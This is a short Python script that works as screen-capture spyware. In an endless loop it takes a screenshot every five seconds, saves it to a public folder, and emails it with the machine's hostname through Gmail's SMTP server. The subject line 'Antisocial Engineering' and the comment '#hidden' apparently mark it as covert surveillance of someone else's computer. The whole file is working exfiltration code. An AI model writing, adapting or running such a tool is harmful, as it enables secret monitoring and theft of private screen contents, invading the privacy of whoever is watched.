import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import os
import time
import socket
 
gmail_user ='' #Your email address
gmail_pwd ='' #Your email password
 
def mail(to, subject, text, attach):  
 
   import autopy
   bitmap = autopy.bitmap.capture_screen()
   bitmap.save('C:\\Users\\Public\\name_of_the_image.png')
   
   msg = MIMEMultipart()
   msg['From'] = 'any-email-you-want@live.com'
   msg['To'] = 'any-email-to-show@outlook.com'
   msg['Subject'] = 'Screenshot from %s' % socket.gethostname() #
 
   msg.attach(MIMEText(text))
 
   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   Encoders.encode_base64(part)
   part.add_header('Content-Disposition',
           'attachment; filename="%s"' % os.path.basename(attach))
   msg.attach(part)
 
   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
   mailServer.close()
 
def main(): 
      while True:
         
         mail("any-email-you-want-to-show@gmail.com",
         "Antisocial Engineering",
         "You have received a new message",
         "C:\\Users\\Public\\name_of_the_image.png") #hidden <3
         time.sleep(5)
 
if __name__=='__main__':
    main()